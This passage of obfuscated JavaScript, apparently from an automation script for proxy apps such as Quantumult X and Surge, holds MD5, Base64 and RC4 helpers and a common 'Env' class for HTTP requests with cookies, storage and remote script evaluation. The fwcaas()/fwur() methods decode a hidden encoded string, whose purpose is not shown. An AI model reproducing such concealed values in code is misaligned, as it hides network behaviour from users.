    _0x245ade = _0xb8b2a6(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 6], _0x164840, 3225465664);
    _0x49eb29 = _0xb8b2a6(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 11], _0x5e1c6b, 643717713);
    _0x11b626 = _0xb8b2a6(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 0], _0x438fae, 3921069994);
    _0xd02e5d = _0xb8b2a6(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 5], _0x3ce67d, 3593408605);
    _0x245ade = _0xb8b2a6(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 10], _0x164840, 38016083);
    _0x49eb29 = _0xb8b2a6(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 15], _0x5e1c6b, 3634488961);
    _0x11b626 = _0xb8b2a6(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 4], _0x438fae, 3889429448);
    _0xd02e5d = _0xb8b2a6(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 9], _0x3ce67d, 568446438);
    _0x245ade = _0xb8b2a6(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 14], _0x164840, 3275163606);
    _0x49eb29 = _0xb8b2a6(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 3], _0x5e1c6b, 4107603335);
    _0x11b626 = _0xb8b2a6(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 8], _0x438fae, 1163531501);
    _0xd02e5d = _0xb8b2a6(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 13], _0x3ce67d, 2850285829);
    _0x245ade = _0xb8b2a6(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 2], _0x164840, 4243563512);
    _0x49eb29 = _0xb8b2a6(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 7], _0x5e1c6b, 1735328473);
    _0x11b626 = _0xb8b2a6(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 12], _0x438fae, 2368359562);
    _0xd02e5d = _0x473979(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 5], _0x2e8153, 4294588738);
    _0x245ade = _0x473979(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 8], _0x3eed5d, 2272392833);
    _0x49eb29 = _0x473979(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 11], _0x22af69, 1839030562);
    _0x11b626 = _0x473979(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 14], _0x5d7162, 4259657740);
    _0xd02e5d = _0x473979(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 1], _0x2e8153, 2763975236);
    _0x245ade = _0x473979(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 4], _0x3eed5d, 1272893353);
    _0x49eb29 = _0x473979(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 7], _0x22af69, 4139469664);
    _0x11b626 = _0x473979(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 10], _0x5d7162, 3200236656);
    _0xd02e5d = _0x473979(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 13], _0x2e8153, 681279174);
    _0x245ade = _0x473979(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 0], _0x3eed5d, 3936430074);
    _0x49eb29 = _0x473979(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 3], _0x22af69, 3572445317);
    _0x11b626 = _0x473979(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 6], _0x5d7162, 76029189);
    _0xd02e5d = _0x473979(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 9], _0x2e8153, 3654602809);
    _0x245ade = _0x473979(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 12], _0x3eed5d, 3873151461);
    _0x49eb29 = _0x473979(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 15], _0x22af69, 530742520);
    _0x11b626 = _0x473979(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 2], _0x5d7162, 3299628645);
    _0xd02e5d = _0x2be6cf(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 0], _0x23734, 4096336452);
    _0x245ade = _0x2be6cf(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 7], _0x21884f, 1126891415);
    _0x49eb29 = _0x2be6cf(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 14], _0x56527d, 2878612391);
    _0x11b626 = _0x2be6cf(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 5], _0x29ac93, 4237533241);
    _0xd02e5d = _0x2be6cf(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 12], _0x23734, 1700485571);
    _0x245ade = _0x2be6cf(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 3], _0x21884f, 2399980690);
    _0x49eb29 = _0x2be6cf(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 10], _0x56527d, 4293915773);
    _0x11b626 = _0x2be6cf(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 1], _0x29ac93, 2240044497);
    _0xd02e5d = _0x2be6cf(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 8], _0x23734, 1873313359);
    _0x245ade = _0x2be6cf(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 15], _0x21884f, 4264355552);
    _0x49eb29 = _0x2be6cf(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 6], _0x56527d, 2734768916);
    _0x11b626 = _0x2be6cf(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 13], _0x29ac93, 1309151649);
    _0xd02e5d = _0x2be6cf(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 4], _0x23734, 4149444226);
    _0x245ade = _0x2be6cf(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 11], _0x21884f, 3174756917);
    _0x49eb29 = _0x2be6cf(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 2], _0x56527d, 718787259);
    _0x11b626 = _0x2be6cf(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 9], _0x29ac93, 3951481745);
    _0xd02e5d = _0x185fb3(_0xd02e5d, _0x2cf043);
    _0x11b626 = _0x185fb3(_0x11b626, _0x2db2e0);
    _0x49eb29 = _0x185fb3(_0x49eb29, _0x3278fd);
    _0x245ade = _0x185fb3(_0x245ade, _0x5298b4);
  }

  var _0xe36ccb = _0x36cdcf(_0xd02e5d) + _0x36cdcf(_0x11b626) + _0x36cdcf(_0x49eb29) + _0x36cdcf(_0x245ade);

  return _0xe36ccb["toLowerCase"]();
}

function FxPCnMKLw7() {
  _keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

  this["encode"] = function (_0x2dce12) {
    var _0x1a2c43 = '',
        _0x477961,
        _0x48cbc2,
        _0x265204,
        _0x3af939,
        _0x1b9f7b,
        _0x53a8fa,
        _0x43b406,
        _0xeb2f8b = 0;

    _0x2dce12 = _utf8_encode(_0x2dce12);

    while (_0xeb2f8b < _0x2dce12["length"]) {
      _0x477961 = _0x2dce12['charCodeAt'](_0xeb2f8b++);
      _0x48cbc2 = _0x2dce12["charCodeAt"](_0xeb2f8b++);
      _0x265204 = _0x2dce12["charCodeAt"](_0xeb2f8b++);
      _0x3af939 = _0x477961 >> 2;
      _0x1b9f7b = (_0x477961 & 3) << 4 | _0x48cbc2 >> 4;
      _0x53a8fa = (_0x48cbc2 & 15) << 2 | _0x265204 >> 6;
      _0x43b406 = _0x265204 & 63;

      if (isNaN(_0x48cbc2)) {
        _0x53a8fa = _0x43b406 = 64;
      } else {
        isNaN(_0x265204) && (_0x43b406 = 64);
      }

      _0x1a2c43 = _0x1a2c43 + _keyStr["charAt"](_0x3af939) + _keyStr["charAt"](_0x1b9f7b) + _keyStr['charAt'](_0x53a8fa) + _keyStr["charAt"](_0x43b406);
    }

    return _0x1a2c43;
  };

  this["decode"] = function (_0x5f23ab) {
    var _0xa07030 = '',
        _0x22ce9a,
        _0x52a3bf,
        _0x102a02,
        _0x37596d,
        _0x2da660,
        _0x1121b0,
        _0x2b7040,
        _0x15bce8 = 0;

    _0x5f23ab = _0x5f23ab["replace"](/[^A-Za-z0-9\+\/\=]/g, '');

    while (_0x15bce8 < _0x5f23ab['length']) {
      _0x37596d = _keyStr["indexOf"](_0x5f23ab['charAt'](_0x15bce8++));
      _0x2da660 = _keyStr['indexOf'](_0x5f23ab["charAt"](_0x15bce8++));
      _0x1121b0 = _keyStr["indexOf"](_0x5f23ab["charAt"](_0x15bce8++));
      _0x2b7040 = _keyStr["indexOf"](_0x5f23ab["charAt"](_0x15bce8++));
      _0x22ce9a = _0x37596d << 2 | _0x2da660 >> 4;
      _0x52a3bf = (_0x2da660 & 15) << 4 | _0x1121b0 >> 2;
      _0x102a02 = (_0x1121b0 & 3) << 6 | _0x2b7040;
      _0xa07030 = _0xa07030 + String["fromCharCode"](_0x22ce9a);
      _0x1121b0 != 64 && (_0xa07030 = _0xa07030 + String["fromCharCode"](_0x52a3bf));
      _0x2b7040 != 64 && (_0xa07030 = _0xa07030 + String["fromCharCode"](_0x102a02));
    }

    _0xa07030 = _utf8_decode(_0xa07030);
    return _0xa07030;
  };

  _utf8_encode = function (_0x2b36e) {
    _0x2b36e = _0x2b36e["replace"](/\r\n/g, "\n");
    var _0x1155fa = '';

    for (var _0x342f60 = 0; _0x342f60 < _0x2b36e['length']; _0x342f60++) {
      var _0x44794a = _0x2b36e["charCodeAt"](_0x342f60);

      if (_0x44794a < 128) {
        _0x1155fa += String["fromCharCode"](_0x44794a);
      } else {
        _0x44794a > 127 && _0x44794a < 2048 ? (_0x1155fa += String['fromCharCode'](_0x44794a >> 6 | 192), _0x1155fa += String["fromCharCode"](_0x44794a & 63 | 128)) : (_0x1155fa += String['fromCharCode'](_0x44794a >> 12 | 224), _0x1155fa += String["fromCharCode"](_0x44794a >> 6 & 63 | 128), _0x1155fa += String["fromCharCode"](_0x44794a & 63 | 128));
      }
    }

    return _0x1155fa;
  };

  _utf8_decode = function (_0x43140f) {
    var _0x136cc2 = '',
        _0x22f2eb = 0,
        _0x49201d = c1 = c2 = 0;

    while (_0x22f2eb < _0x43140f["length"]) {
      _0x49201d = _0x43140f["charCodeAt"](_0x22f2eb);

      if (_0x49201d < 128) {
        _0x136cc2 += String["fromCharCode"](_0x49201d);
        _0x22f2eb++;
      } else {
        _0x49201d > 191 && _0x49201d < 224 ? (c2 = _0x43140f["charCodeAt"](_0x22f2eb + 1), _0x136cc2 += String["fromCharCode"]((_0x49201d & 31) << 6 | c2 & 63), _0x22f2eb += 2) : (c2 = _0x43140f["charCodeAt"](_0x22f2eb + 1), c3 = _0x43140f['charCodeAt'](_0x22f2eb + 2), _0x136cc2 += String["fromCharCode"]((_0x49201d & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x22f2eb += 3);
      }
    }

    return _0x136cc2;
  };
}

function rc4(_0x3da225, _0x445424) {
  var _0x32c85b = Array(256),
      _0x380bda = Array(_0x3da225['length']);

  for (var _0x2135e5 = 0; _0x2135e5 < 256; _0x2135e5++) {
    _0x32c85b[_0x2135e5] = _0x2135e5;

    var _0x64bfed = (_0x64bfed + _0x32c85b[_0x2135e5] + _0x445424["charCodeAt"](_0x2135e5 % _0x445424["length"])) % 256,
        _0x135114 = _0x32c85b[_0x2135e5];

    _0x32c85b[_0x2135e5] = _0x32c85b[_0x64bfed];
    _0x32c85b[_0x64bfed] = _0x135114;
  }

  for (var _0x2135e5 = 0; _0x2135e5 < _0x3da225["length"]; _0x2135e5++) {
    _0x380bda[_0x2135e5] = _0x3da225["charCodeAt"](_0x2135e5);
  }

  for (var _0x102d28 = 0; _0x102d28 < _0x380bda["length"]; _0x102d28++) {
    var _0x2135e5 = (_0x2135e5 + 1) % 256,
        _0x64bfed = (_0x64bfed + _0x32c85b[_0x2135e5]) % 256,
        _0x135114 = _0x32c85b[_0x2135e5];

    _0x32c85b[_0x2135e5] = _0x32c85b[_0x64bfed];
    _0x32c85b[_0x64bfed] = _0x135114;

    var _0x7806cb = (_0x32c85b[_0x2135e5] + _0x32c85b[_0x64bfed] % 256) % 256;

    _0x380bda[_0x102d28] = String["fromCharCode"](_0x380bda[_0x102d28] ^ _0x32c85b[_0x7806cb]);
  }

  return _0x380bda['join']('');
}

function Env(t, e) {
  class s {
    constructor(t) {
      this["env"] = t;
    }

    send(t, e = "GET") {
      t = "string" == typeof t ? {
        "url": t
      } : t;
      let s = this["get"];
      "POST" === e && (s = this["post"]);
      return new Promise((e, i) => {
        s["call"](this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }

    get(t) {
      return this["send"]["call"](this["env"], t);
    }

    post(t) {
      return this["send"]["call"](this["env"], t, "POST");
    }

  }

  return new class {
    constructor(t, e) {
      this["name"] = t;
      this["http"] = new s(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["encoding"] = "utf-8";
      this["startTime"] = new Date()["getTime"]();
      Object["assign"](this, e);
      this["log"]("", `🔔${this["name"]}, 开始!`);
    }

    isNode() {
      return "undefined" != typeof module && !!module["exports"];
    }

    isQuanX() {
      return "undefined" != typeof $task;
    }

    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }

    isLoon() {
      return "undefined" != typeof $loon;
    }

    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }

    toObj(t, e = null) {
      try {
        return JSON["parse"](t);
      } catch {
        return e;
      }
    }

    toStr(t, e = null) {
      try {
        return JSON["stringify"](t);
      } catch {
        return e;
      }
    }

    getjson(t, e) {
      let s = e;
      const i = this["getdata"](t);

      if (i) {
        try {
          s = JSON["parse"](this["getdata"](t));
        } catch {}
      }

      return s;
    }

    setjson(t, e) {
      try {
        return this["setdata"](JSON["stringify"](t), e);
      } catch {
        return false;
      }
    }

    getScript(t) {
      return new Promise(e => {
        this["get"]({
          "url": t
        }, (t, s, i) => e(i));
      });
    }

    runScript(t, e) {
      return new Promise(s => {
        let i = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i["replace"](/\n/g, "")["trim"]() : i;
        let r = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e["timeout"] ? e["timeout"] : r;
        const [o, h] = i["split"]("@"),
              n = {
          "url": `http://${h}/v1/scripting/evaluate`,
          "body": {
            "script_text": t,
            "mock_type": "cron",
            "timeout": r
          },
          "headers": {
            "X-Key": o,
            "Accept": "*/*"
          }
        };
        this["post"](n, (t, e, i) => s(i));
      })["catch"](t => this["logErr"](t));
    }

    loaddata() {
      if (!this["isNode"]()) {
        return {};
      }

      {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e);

        if (!s && !i) {
          return {};
        }

        {
          const i = s ? t : e;

          try {
            return JSON["parse"](this["fs"]["readFileSync"](i));
          } catch (t) {
            return {};
          }
        }
      }
    }

    writedata() {
      if (this["isNode"]()) {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e),
              r = JSON["stringify"](this["data"]);
        s ? this["fs"]["writeFileSync"](t, r) : i ? this["fs"]["writeFileSync"](e, r) : this["fs"]["writeFileSync"](t, r);
      }
    }

    lodash_get(t, e, s) {
      const i = e["replace"](/\[(\d+)\]/g, ".$1")["split"](".");
      let r = t;

      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }

      return r;
    }

    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array["isArray"](e) || (e = e["toString"]()["match"](/[^.[\]]+/g) || []), e["slice"](0, -1)["reduce"]((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math["abs"](e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e["length"] - 1]] = s, t);
    }

    getdata(t) {
      let e = this["getval"](t);

      if (/^@/["test"](t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/["exec"](t),
              r = s ? this["getval"](s) : "";

        if (r) {
          try {
            const t = JSON["parse"](r);
            e = t ? this["lodash_get"](t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }

      return e;
    }

    setdata(t, e) {
      let s = false;

      if (/^@/["test"](e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/["exec"](e),
              o = this["getval"](i),
              h = i ? "null" === o ? null : o || "{}" : "{}";

        try {
          const e = JSON["parse"](h);
          this["lodash_set"](e, r, t);
          s = this["setval"](JSON["stringify"](e), i);
        } catch (e) {
          const o = {};
          this["lodash_set"](o, r, t);
          s = this["setval"](JSON["stringify"](o), i);
        }
      } else {
        s = this["setval"](t, e);
      }

      return s;
    }

    getval(t) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](t) : this["isQuanX"]() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][t]) : this["data"] && this["data"][t] || null;
    }

    setval(t, e) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](t, e) : this["isQuanX"]() ? $prefs["setValueForKey"](t, e) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][e] = t, this["writedata"](), true) : this["data"] && this["data"][e] || null;
    }

    initGotEnv(t) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]["Cookie"] && void 0 === t["cookieJar"] && (t["cookieJar"] = this["ckjar"]));
    }

    get(t, e = () => {}) {
      if (t["headers"] && (delete t["headers"]["Content-Type"], delete t["headers"]["Content-Length"]), this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient["get"](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let s = require("iconv-lite");

            this["initGotEnv"](t);
            this["got"](t)["on"]("redirect", (t, e) => {
              try {
                if (t["headers"]["set-cookie"]) {
                  const s = t["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();
                  s && this["ckjar"]["setCookieSync"](s, null);
                  e["cookieJar"] = this["ckjar"];
                }
              } catch (t) {
                this["logErr"](t);
              }
            })["then"](t => {
              const {
                "statusCode": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, s["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": i,
                "response": r
              } = t;
              e(i, r, r && s["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    post(t, e = () => {}) {
      const s = t["method"] ? t["method"]["toLocaleLowerCase"]() : "post";

      if (t["body"] && t["headers"] && !t["headers"]["Content-Type"] && (t["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          t["method"] = s;
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let i = require("iconv-lite");

            this["initGotEnv"](t);
            const {
              "url": r,
              ...o
            } = t;
            this["got"][s](r, o)["then"](t => {
              const {
                "statusCode": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, i["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": s,
                "response": r
              } = t;
              e(s, r, r && i["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s["getMonth"]() + 1,
        "d+": s["getDate"](),
        "H+": s["getHours"](),
        "m+": s["getMinutes"](),
        "s+": s["getSeconds"](),
        "q+": Math["floor"]((s["getMonth"]() + 3) / 3),
        "S": s["getMilliseconds"]()
      };
      /(y+)/["test"](t) && (t = t["replace"](RegExp["$1"], (s["getFullYear"]() + "")["substr"](4 - RegExp["$1"]["length"])));

      for (let e in i) new RegExp("(" + e + ")")["test"](t) && (t = t["replace"](RegExp["$1"], 1 == RegExp["$1"]["length"] ? i[e] : ("00" + i[e])["substr"](("" + i[e])["length"])));

      return t;
    }

    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }

        if ("string" == typeof t) {
          return this["isLoon"]() ? t : this["isQuanX"]() ? {
            "open-url": t
          } : this["isSurge"]() ? {
            "url": t
          } : void 0;
        }

        if ("object" == typeof t) {
          if (this["isLoon"]()) {
            let e = t["openUrl"] || t["url"] || t["open-url"],
                s = t["mediaUrl"] || t["media-url"];
            return {
              "openUrl": e,
              "mediaUrl": s
            };
          }

          if (this["isQuanX"]()) {
            let e = t["open-url"] || t["url"] || t["openUrl"],
                s = t["media-url"] || t["mediaUrl"];
            return {
              "open-url": e,
              "media-url": s
            };
          }

          if (this["isSurge"]()) {
            let e = t["url"] || t["openUrl"] || t["open-url"];
            return {
              "url": e
            };
          }
        }
      };

      if (this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](e, s, i, o(r)) : this["isQuanX"]() && $notify(e, s, i, o(r))), !this["isMuteLog"]) {
        let t = ["", "==============📣系统通知📣=============="];
        t["push"](e);
        s && t["push"](s);
        i && t["push"](i);
        console["log"](t["join"]("\n"));
        this["logs"] = this["logs"]["concat"](t);
      }
    }

    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }

    log(...t) {
      t["length"] > 0 && (this["logs"] = [...this["logs"], ...t]);
      console["log"](t["join"](this["logSeparator"]));
    }

    logErr(t, e) {
      const s = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
      s ? this["log"]("", `❗️${this["name"]}, 错误!`, t["stack"]) : this["log"]("", `❗️${this["name"]}, 错误!`, t);
    }

    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas["decode"](this["fwcaas"]());
    }

    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }

    done(t = {}) {
      const e = new Date()["getTime"](),
            s = (e - this["startTime"]) / 1e3;
      this["log"]("", `🔔${this["name"]}, 结束! 🕛 ${s} 秒`);
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
    }

  }(t, e);
}
